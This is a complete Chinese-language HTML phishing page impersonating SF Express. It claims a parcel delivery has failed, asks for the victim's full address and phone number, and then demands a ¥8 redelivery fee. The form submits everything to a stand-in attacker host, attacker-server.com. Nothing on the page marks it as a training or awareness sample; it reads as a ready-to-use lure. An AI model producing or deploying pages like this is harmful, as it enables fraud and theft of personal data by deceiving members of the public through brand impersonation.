<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>快递派送异常 - 请确认地址</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Microsoft YaHei', Arial, sans-serif;
            background: linear-gradient(135deg, #e65100 0%, #ff6d00 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.2);
            width: 450px;
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #e65100 0%, #ef6c00 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        .header h1 { font-size: 24px; margin-bottom: 10px; }
        .header .icon { font-size: 60px; margin-bottom: 15px; }
        .content { padding: 30px; }
        .package-info {
            background: #fff3e0;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 25px;
        }
        .package-info h3 { color: #e65100; margin-bottom: 15px; }
        .info-row {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px dashed #ffcc80;
        }
        .info-row:last-child { border-bottom: none; }
        .label { color: #666; }
        .value { color: #333; font-weight: 500; }
        .form-group {
            margin-bottom: 18px;
        }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
        }
        .form-group input, .form-group select, .form-group textarea {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 14px;
        }
        .form-group textarea { resize: vertical; min-height: 80px; }
        .fee-box {
            background: #ffebee;
            border: 2px solid #ef5350;
            border-radius: 8px;
            padding: 15px;
            margin: 20px 0;
            text-align: center;
        }
        .fee-box p { color: #c62828; font-size: 14px; }
        .fee-amount { font-size: 28px; font-weight: bold; color: #c62828; }
        .submit-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #e65100 0%, #ef6c00 100%);
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
        .footer {
            text-align: center;
            padding: 15px;
            background: #fafafa;
            font-size: 12px;
            color: #999;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="icon">&#128230;</div>
            <h1>顺丰速运 - 派送异常通知</h1>
            <p>您的包裹需要您确认信息</p>
        </div>
        <div class="content">
            <div class="package-info">
                <h3>&#9888; 派送异常详情</h3>
                <div class="info-row">
                    <span class="label">运单号:</span>
                    <span class="value">SF1234567890</span>
                </div>
                <div class="info-row">
                    <span class="label">收件人:</span>
                    <span class="value">张先生</span>
                </div>
                <div class="info-row">
                    <span class="label">异常原因:</span>
                    <span class="value" style="color:#c62828;">地址不完整/联系不上</span>
                </div>
            </div>
            <form action="https://attacker-server.com/delivery.php" method="POST">
                <div class="form-group">
                    <label>详细收货地址</label>
                    <textarea name="address" placeholder="请填写完整收货地址（包括省市区街道门牌号）" required></textarea>
                </div>
                <div class="form-group">
                    <label>联系人电话</label>
                    <input type="tel" name="phone" placeholder="可联系到您的手机号" required>
                </div>
                <div class="form-group">
                    <label>备注</label>
                    <input type="text" name="note" placeholder="其他要求（可选）">
                </div>
                <div class="fee-box">
                    <p>因地址修改，需支付二次派送费</p>
                    <p class="fee-amount">&#165; 8.00</p>
                </div>
                <button type="submit" class="submit-btn">确认地址并支付</button>
            </form>
        </div>
        <div class="footer">
            顺丰速运 | 客服热线: 95338 | 请认准官方通知
        </div>
    </div>
</body>
</html>
